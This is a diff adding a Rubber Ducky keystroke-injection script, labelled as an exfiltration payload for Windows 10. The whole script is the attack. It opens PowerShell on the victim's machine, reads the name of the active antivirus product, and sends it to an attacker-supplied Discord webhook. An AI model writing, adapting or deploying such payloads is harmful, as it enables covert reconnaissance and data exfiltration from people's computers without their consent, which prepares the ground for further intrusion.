@@ -1,0 +1,37 @@
+REM Author: Woozy
+REM Description: This script will get the active antivirus name and send it to a Discord webhook.
+REM Version:	1.0
+REM Category:   Exfiltration
+REM Target:	Windows 10
+
+
+REM Open PowerShell
+WINDOWS r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 500
+
+REM Get active antivirus name
+STRING $AntiVirus = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct | Select-Object -ExpandProperty displayName
+ENTER
+DELAY 500
+STRING $body = @{ content = $AntiVirus } | ConvertTo-Json
+ENTER
+REM Send antivirus name to Discord webhook
+STRING $webhookUrl = "YOUR_DISCORD_WEBHOOK"
+ENTER
+DELAY 200
+STRING $body = @{ content = $AntiVirus } | ConvertTo-Json
+ENTER
+DELAY 200
+STRING Invoke-RestMethod -Uri $webhookUrl -Method POST -ContentType "application/json" -Body $body
+ENTER
+DELAY 500
+
+REM Close PowerShell
+STRING exit
+ENTER
+DELAY 200
+
+REM END: Ducky script
